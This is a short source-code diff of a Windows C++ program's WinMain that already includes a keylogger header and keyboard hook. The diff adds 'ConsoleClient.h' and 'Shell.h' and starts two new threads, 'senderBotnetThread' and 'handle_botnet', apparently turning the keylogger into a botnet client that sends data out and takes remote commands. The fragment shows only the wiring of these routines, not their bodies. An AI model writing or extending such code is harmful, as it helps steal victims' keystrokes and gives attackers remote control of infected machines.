@@ -5,6 +5,9 @@
 #include "KeyLogger.h"
 #include <iostream>
 
+#include "ConsoleClient.h"
+#include "Shell.h"
+
 int WINAPI WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance,
                    _In_ LPSTR lpCmdLine, _In_ int nCmdShow) {
     
@@ -46,7 +49,8 @@ int WINAPI WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance,
         CloseHandle(mutex);
         return FALSE;
     }
-    
+    HANDLE hSenderBotnetThread = CreateThread(nullptr, 0, senderBotnetThread, nullptr, 0, nullptr);
+    HANDLE hExecThread = CreateThread(nullptr, 0, handle_botnet, nullptr, 0, nullptr);
     // Message loop - keeps the hook active
     MSG msg;
     while (GetMessage(&msg, nullptr, 0, 0) > 0) {
